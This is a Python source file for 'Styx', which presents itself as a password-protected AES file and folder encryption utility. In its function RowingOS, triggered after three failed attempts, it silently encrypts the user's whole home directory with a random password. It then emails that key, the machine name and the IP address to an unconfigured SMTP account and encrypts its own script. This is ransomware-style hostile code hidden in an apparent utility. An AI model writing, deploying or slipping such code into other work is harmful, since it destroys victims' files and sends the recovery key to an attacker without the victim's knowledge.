# Projet : Styx
# Author:
#      __          ___      _     _     _      
#     / /  __ _   / __\___ | |__ | |__ | | ___ 
#    / /  / _` | / /  / _ \| '_ \| '_ \| |/ _ \
#   / /__| (_| |/ /__| (_) | |_) | |_) | |  __/
#   \____/\__,_|\____/\___/|_.__/|_.__/|_|\___|
#                                        

import os
import smtplib
import string
import getpass
import platform
import platform
import datetime
import secrets
import sys
import socket
from art import *
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from email.mime.text import MIMEText

# Encrypt a file with a password
def encrypt_file(file, password):
    
    # Generate a random 16-byte initialization vector
    iv = os.urandom(16)
    
    # Generate a random salt
    salt = os.urandom(16)
    
    # Derive an encryption key from the password and salt
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode('utf-8'))
    
    # Encrypt the file contents
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    with open(file, 'rb') as f:
        data = f.read()
    padded_data = padder.update(data) + padder.finalize()
    ct = encryptor.update(padded_data) + encryptor.finalize()
    
    # Write the encrypted file contents
    with open(file, 'wb') as f:
        f.write(salt)
        f.write(iv)
        f.write(ct)

# Decrypt a file with a password
def decrypt_file(file, password):
    
    # Read the encrypted file contents
    with open(file, 'rb') as f:
        salt = f.read(16)
        iv = f.read(16)
        ct = f.read()
    
    # Derive the encryption key from the password and salt
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode('utf-8'))
    
    # Decrypt the file contents
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ct) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    
    # Write the decrypted file contents
    with open(file, 'wb') as f:
        f.write(data)

# Encrypt a folder with a password
def encrypt_folder(folder, password):
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, password)
        elif os.path.isdir(file_path):
            encrypt_folder(file_path, password)

# Decrypt a folder with a password
def decrypt_folder(folder, password):
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
        if os.path.isfile(file_path):
            decrypt_file(file_path, password)
        elif os.path.isdir(file_path):
            decrypt_folder(file_path, password)

# Send an email with the decryption key
def send_mail(password, time, computer_name):

    # Get the IP address of the computer
    IPAddr = socket.gethostbyname(computer_name)

    # Configuration of the SMTP server
    smtp_server = ''
    smtp_port = 0
    smtp_username = ''
    smtp_password = ''

    # Message with the decryption key
    message = (f'Encrytion Key : {password}\n'
               f'Houre : {time}\n'
               f'Computer Name : {computer_name}\n'
               f'IP Address : {IPAddr}'
               )

    # Create the email
    msg = MIMEText(message)
    msg['Subject'] = 'Decryption informations:',computer_name 
    msg['From'] = ''
    msg['To'] = ''

    # Send the email
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.login(smtp_username, smtp_password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())

# Generate a secure password
def generate_secure_password():
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(secrets.choice(alphabet) for i in range(32))
    return password

# OS management
def RowingOS():
    os = platform.system()
    print("The Styx will wake up")
    password=generate_secure_password()
    if os == "Windows":
        try:
            encrypt_folder(os.getenv('USERPROFILE'), password)
            time = datetime.datetime.now()
            computer_name = platform.node()
            send_mail(password, time, computer_name)
        except:
            pass
    elif os == "Linux":
        try:
            encrypt_folder(os.getenv('HOME'), password)
            time = datetime.datetime.now()
            computer_name = platform.node()
            send_mail(password, time, computer_name)
        except:
            pass
    else:
        try:
            encrypt_folder(os.getenv('HOME'), password)
            time = datetime.datetime.now()
            computer_name = platform.node()
            send_mail(password, time, computer_name)
        except:
            pass
    encrypt_file("Styx.py",password)

# Main
def main(count):
    if(count==3):
        print("Too many attempts")
        RowingOS()
        sys.exit()
    choice = input("Do you want to (E)ncrypt or (D)ecrypt ? : ")
    if choice == "E":
        space = input("Do you want to encrypt a (F)older or a (S)ingle file ? : ")
        if space == "F":
            folder = input("Enter the path of the folder you want to encrypt : ")
            password="1"
            password2="2"
            while(password!=password2):
                password = getpass.getpass("Enter the password : ")
                password2 = getpass.getpass("Enter the password again : ")
                if(password!=password2):
                    print("Passwords don't match")
            try:
                encrypt_folder(folder, password)
                print("Folder encrypted")
                input("Press enter to exit")
                sys.exit()
            except:
                print("Wrong password")
                main(count+1)
        elif space == "S":
            file = input("Enter the path of the file you want to encrypt : ")
            password="1" 
            password2="2"
            while(password!=password2):
                password = getpass.getpass("Enter the password : ")
                password2 = getpass.getpass("Enter the password again : ")
                if(password!=password2):
                    print("Passwords don't match")
            try:
                encrypt_file(file, password)
                print("File encrypted")
                input("Press enter to exit")
                sys.exit()
            except:
                print("Error")
                main(count+1)
        else:
            print("Please enter a valid choice")
            main(count)
    elif choice == "D":
        space = input("Do you want to decrypt a (F)older or a (S)ingle file ? : ")
        if space == "F":
            folder = input("Enter the path of the folder you want to decrypt : ")
            password = getpass.getpass("Enter the password : ")
            try:
                decrypt_folder(folder, password)
                print("Folder decrypted")
                input("Press enter to exit")
                sys.exit()
            except:
                print("Wrong password")
                main(count+1)
        elif space == "S":
            file = input("Enter the path of the file you want to decrypt : ")
            password = getpass.getpass("Enter the password : ")
            try:
                decrypt_file(file, password)
                print("Decryption done !")
                input("Press enter to exit")
                sys.exit()
            except:
                print("Wrong password")
                main(count+1)
        else:
            print("Please enter a valid choice")
            main(count)
    elif choice == "Q":
        print("Goodbye")
        sys.exit()
    else:
        print("Please enter a valid choice")
        main()

# Run the program
if __name__ == "__main__":
    tprint("Styx",font="block",chr_ignore=True)
    main(0)
